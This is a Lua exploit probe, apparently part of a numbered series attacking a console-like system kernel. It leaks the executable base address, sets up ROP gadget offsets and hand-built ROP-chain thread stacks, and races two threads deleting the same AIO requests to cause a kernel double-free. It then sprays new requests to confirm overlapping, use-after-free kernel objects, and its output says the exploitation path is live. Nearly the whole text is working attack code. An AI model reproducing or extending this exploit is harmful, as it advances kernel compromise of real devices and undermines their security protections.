-- CRASH_CLASS: HIGH
-- PROBE 65p: AIO self-overlap after double-free
--
-- 65o: kqueue/namedobj spray doesn't reclaim AIO slots — different zone.
-- Hypothesis: AIO uses a dedicated UMA zone, so only AIO allocs reclaim.
-- The double-free puts the same chunk on the freelist TWICE.
-- Therefore: the next TWO AIO submits get the SAME kernel memory.
--
-- Test plan:
--   1. Submit 16 AIO requests, poll all
--   2. Double-free via two racing children (proven in 65l/65o)
--   3. Submit 32 new AIO requests (some should reclaim double-freed slots)
--   4. Poll all 32
--   5. Delete the first 16 of the new requests
--   6. Check if any of the remaining 16 are now invalid (stale/dangling)
--      → If deleting request A kills request B, they shared kernel memory
--   7. Also: submit requests one at a time and check if poll shows stale data
--
-- Variant B: after double-free, submit request A, submit request B,
-- delete A, poll B. If B returns anything unusual (crash, wrong state,
-- data corruption), the overlap is confirmed.

print("=== PROBE 65p: AIO self-overlap after double-free ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

local BATCH = 16
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

local function wait_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(663)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

-- Build delete child
local function build_delete_child(del_ids_addr, count, states_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(del_ids_addr))
    emit(g_pop_rsi); emit(uint64(count))
    emit(g_pop_rdx); emit(uint64(states_addr))
    emit(g_pop_rax); emit(uint64(662))
    emit(stub)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(N(par) + 0x30, tid)
    return par
end

local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)

-- [A] Baseline: submit, poll, delete-one, poll-other (no double-free)
print("[A] Baseline: normal delete-then-poll (no race)")
local base_ids = {}
for i = 1, 4 do
    local id = submit_one()
    if id ~= 0 then
        poll_one(id)
        table.insert(base_ids, id)
    end
end
print(string.format("  submitted %d IDs", #base_ids))
-- Delete first two, check last two still work
local ds1 = delete_one(base_ids[1])
local ds2 = delete_one(base_ids[2])
local ps3 = poll_one(base_ids[3])
local ps4 = poll_one(base_ids[4])
print(string.format("  delete[0]=0x%X delete[1]=0x%X", ds1, ds2))
print(string.format("  poll[2]=0x%X poll[3]=0x%X (should both be 0)", ps3, ps4))
-- Now delete the rest normally
delete_one(base_ids[3])
delete_one(base_ids[4])

if not alive() then print("DEAD"); return end

-- [B] Double-free then immediate re-submit
print("")
print("[B] Double-free → re-submit → cross-delete test")

local ITERS = 10
local overlap_hits = 0

for iter = 1, ITERS do
    if not alive() then
        print(string.format("  iter %d: DEAD", iter))
        break
    end

    -- Submit + poll 16 requests
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then
            poll_one(id)
            table.insert(ids, id)
        end
    end
    local count = #ids
    if count < 8 then
        print(string.format("  iter %d: only %d IDs", iter, count))
        break
    end

    -- Setup race arrays
    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end

    -- Race: two children delete simultaneously
    local par_A = build_delete_child(N(del_ids), count, N(states_A))
    local par_B = build_delete_child(N(del_ids), count, N(states_B))
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)
    for w = 1, 50000 do local _ = rd(N(del_ids)) end

    -- Count double-frees
    local doubles = 0
    for i = 0, count - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end

    if not alive() then
        print(string.format("  iter %d: CRASHED during double-free (doubles=%d)", iter, doubles))
        break
    end

    if doubles == 0 then
        if iter <= 3 or iter == ITERS then
            print(string.format("  iter %d: 0 doubles, skipping", iter))
        end
        -- Clean up: new requests to drain anything leftover
        -- (IDs are gone from the table, nothing to clean)
        repeat until true -- continue
    else
        -- Double-free occurred! Now submit new requests to reclaim
        -- The double-freed chunk is on the freelist TWICE.
        -- First N allocs return unique chunks, but two of them
        -- will return the SAME chunk (the double-freed one).

        -- Submit 2*doubles + 8 extra to ensure we reclaim both copies
        local new_count = doubles * 2 + 8
        if new_count > 48 then new_count = 48 end
        local new_ids = {}
        for i = 1, new_count do
            local nid = submit_one()
            if nid ~= 0 then table.insert(new_ids, nid) end
        end

        -- Poll all new requests
        for _, nid in ipairs(new_ids) do poll_one(nid) end

        -- Now the key test: delete the first half, check if the second half dies
        local half = math.floor(#new_ids / 2)
        local killed = 0
        local still_valid = 0
        local anomalies = 0

        -- Delete first half one at a time
        for i = 1, half do
            local st = delete_one(new_ids[i])
            if st ~= 0 then
                -- Already invalid? Shouldn't happen for freshly polled IDs
                anomalies = anomalies + 1
            end
        end

        if not alive() then
            print(string.format("  iter %d: CRASHED during cross-delete (doubles=%d) *** OVERLAP! ***", iter, doubles))
            overlap_hits = overlap_hits + 1
            break
        end

        -- Check second half: poll each one
        for i = half + 1, #new_ids do
            local st = poll_one(new_ids[i])
            if st == 0 then
                still_valid = still_valid + 1
            else
                -- This request became invalid after we deleted a DIFFERENT request!
                -- → They shared the same kernel memory → OVERLAP CONFIRMED
                killed = killed + 1
            end
        end

        -- Also try wait on second half
        local wait_anomalies = 0
        for i = half + 1, #new_ids do
            local wst = wait_one(new_ids[i])
            if wst ~= 0 and wst ~= 0xDEAD then
                wait_anomalies = wait_anomalies + 1
            end
        end

        -- Clean up remaining
        for i = half + 1, #new_ids do
            pcall(function() delete_one(new_ids[i]) end)
        end

        if killed > 0 then
            overlap_hits = overlap_hits + 1
            print(string.format("  iter %d: *** OVERLAP! doubles=%d new=%d killed=%d/%d anomalies=%d wait_anom=%d ***",
                iter, doubles, #new_ids, killed, #new_ids - half, anomalies, wait_anomalies))
        elseif iter <= 3 or iter == ITERS or anomalies > 0 then
            print(string.format("  iter %d: doubles=%d new=%d valid=%d/%d anomalies=%d wait_anom=%d",
                iter, doubles, #new_ids, still_valid, #new_ids - half, anomalies, wait_anomalies))
        elseif iter == 4 then
            print("  ...")
        end
    end
end

if not alive() then
    print("")
    print("PROCESS DIED — check if UAF crash")
    print("")
    print("=== 65p COMPLETE (CRASH) ===")
    return
end

-- [C] More aggressive: submit ONE at a time, delete, check neighbors
print("")
print("[C] Single-submit overlap test")

for trial = 1, 5 do
    if not alive() then break end

    -- Double-free 16 IDs
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then
            poll_one(id)
            table.insert(ids, id)
        end
    end
    local count = #ids
    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end
    local par_A = build_delete_child(N(del_ids), count, N(states_A))
    local par_B = build_delete_child(N(del_ids), count, N(states_B))
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)
    for w = 1, 50000 do local _ = rd(N(del_ids)) end

    local doubles = 0
    for i = 0, count - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end

    if not alive() then
        print(string.format("  trial %d: CRASHED (doubles=%d)", trial, doubles))
        break
    end
    if doubles == 0 then
        print(string.format("  trial %d: no doubles", trial))
        repeat until true -- continue
    else
        -- Submit pairs, delete first of each pair, poll second
        local pair_count = doubles * 3
        if pair_count > 24 then pair_count = 24 end
        local first_ids = {}
        local second_ids = {}
        for i = 1, pair_count do
            local id = submit_one()
            if id ~= 0 then
                poll_one(id)
                table.insert(first_ids, id)
            end
        end
        for i = 1, pair_count do
            local id = submit_one()
            if id ~= 0 then
                poll_one(id)
                table.insert(second_ids, id)
            end
        end

        -- Delete all firsts
        for _, id in ipairs(first_ids) do delete_one(id) end

        if not alive() then
            print(string.format("  trial %d: CRASHED during first-set delete (doubles=%d) *** UAF! ***", trial, doubles))
            break
        end

        -- Poll all seconds — any that became invalid = overlap
        local cross_killed = 0
        for _, id in ipairs(second_ids) do
            local st = poll_one(id)
            if st ~= 0 then cross_killed = cross_killed + 1 end
        end

        -- Delete remaining seconds
        for _, id in ipairs(second_ids) do
            pcall(function() delete_one(id) end)
        end

        if cross_killed > 0 then
            overlap_hits = overlap_hits + 1
        end
        print(string.format("  trial %d: doubles=%d first=%d second=%d cross_killed=%d%s",
            trial, doubles, #first_ids, #second_ids, cross_killed,
            cross_killed > 0 and " *** OVERLAP! ***" or ""))
    end
end

print("")
print("[D] SUMMARY")
print(string.format("  overlap hits: %d", overlap_hits))
print(string.format("  process:      %s", alive() and "ALIVE" or "DEAD"))

if overlap_hits > 0 then
    print("")
    print("*** AIO OBJECT OVERLAP CONFIRMED ***")
    print("*** Double-freed chunks reclaimed by new AIO requests ***")
    print("*** Deleting one corrupts the other — exploitation path is live ***")
else
    print("")
    print("No overlap detected. Possible explanations:")
    print("  - AIO zone has per-object generation checks")
    print("  - Free list is LIFO and requests reclaim in predictable order")
    print("  - Need more requests to exhaust the free list before recycling")
end

print("")
print("=== 65p COMPLETE ===")
